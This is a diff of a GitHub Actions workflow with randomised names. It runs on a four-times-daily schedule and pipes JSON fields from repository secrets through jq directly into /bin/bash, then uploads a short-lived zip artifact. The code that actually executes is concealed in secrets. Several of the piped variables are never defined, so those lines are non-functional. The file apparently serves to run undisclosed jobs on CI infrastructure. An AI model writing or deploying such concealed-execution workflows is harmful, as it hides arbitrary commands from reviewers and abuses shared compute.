@@ -1,23 +1,27 @@
 name: xiduanshunkang
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '37 1/6 * * *'
 
-jobs:  # 11396
+  schedule:
+    - cron: '46 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xiduanshunkang
         env:
-          mpst5: ${{ secrets.mpst5 }}
+          djupn6: ${{ secrets.djupn6 }}
         run: |
-          echo $mpst5 | jq -r .n02 | /bin/bash
-          echo $bnljz7056 | jq -r .da3567 | /bin/bash
-          echo $x53 | jq -r .kqybw625 | /bin/bash
-          echo $ryezq23293 | jq -r .ibe54972 | /bin/bash
-          echo $rwae386 | jq -r .l9115 | /bin/bash
-          echo $q944 | jq -r .b4 | /bin/bash
+          printf '%s' "$djupn6" | jq -r .zrotq96 | /bin/bash
+          echo $pqjrm90248 | jq -r .x10 | /bin/bash
+          echo $ql511 | jq -r .qso833 | /bin/bash
+          printf '%s' "$dhy0191" | jq -r .arudk428 | /bin/bash
+          echo $bxvh9 | jq -r .vxw91 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: X7HTVS5m
+          path: "*.zip"
+          retention-days: 1
